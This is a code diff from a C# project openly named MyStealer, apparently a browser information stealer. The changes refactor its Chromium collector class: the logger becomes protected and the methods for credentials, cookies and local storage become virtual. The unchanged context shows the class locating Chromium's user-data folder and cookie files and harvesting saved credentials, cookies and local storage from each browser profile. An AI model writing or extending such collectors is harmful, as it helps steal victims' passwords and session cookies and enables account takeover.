@@ -15,7 +15,7 @@ namespace MyStealer.Collectors.Browser
         public virtual string ApplicationName => "Chromium";
 
         private ILogger lazyLogger;
-        public ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));
+        protected ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));
 
         protected virtual string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Chromium", "User Data");
         protected virtual string[] CookieFilePathList => new string[] { "Cookies", Path.Combine("Network", "Cookies") };
@@ -34,7 +34,7 @@ namespace MyStealer.Collectors.Browser
             Logger.Debug("Discovered profiles: {profiles}", string.Join(", ", profileNameList));
         }
 
-        public ISet<CredentialEntry> GetCredentials()
+        public virtual ISet<CredentialEntry> GetCredentials()
         {
             var set = new HashSet<CredentialEntry>();
             foreach (var profileName in profileNameList)
@@ -46,7 +46,7 @@ namespace MyStealer.Collectors.Browser
             return set;
         }
 
-        public ISet<CookieEntry> GetCookies()
+        public virtual ISet<CookieEntry> GetCookies()
         {
             var set = new HashSet<CookieEntry>();
             foreach (var profileName in profileNameList)
@@ -61,7 +61,7 @@ namespace MyStealer.Collectors.Browser
             return set;
         }
 
-        public ISet<LocalStorageEntry> GetLocalStorageEntries()
+        public virtual ISet<LocalStorageEntry> GetLocalStorageEntries()
         {
             var set = new HashSet<LocalStorageEntry>();
             foreach (var profileName in profileNameList)
